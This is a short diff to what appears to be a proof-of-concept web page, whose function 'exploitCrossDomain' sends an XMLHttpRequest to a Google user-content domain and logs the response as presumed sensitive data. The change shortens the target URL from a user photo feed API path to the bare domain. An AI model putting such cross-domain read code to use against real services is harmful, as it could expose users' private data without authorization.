@@ -8,7 +8,7 @@
         // Function to simulate a request to the vulnerable domain
         function exploitCrossDomain() {
             var xhr = new XMLHttpRequest();
-            xhr.open('GET', 'https://photos.fife.usercontent.google.com/data/feed/api/user/default', true);
+            xhr.open('GET', 'https://photos.fife.usercontent.google.com', true);
             xhr.onload = function() {
                 // Assume the response contains sensitive data
                 console.log("Response from vulnerable domain:", xhr.responseText);
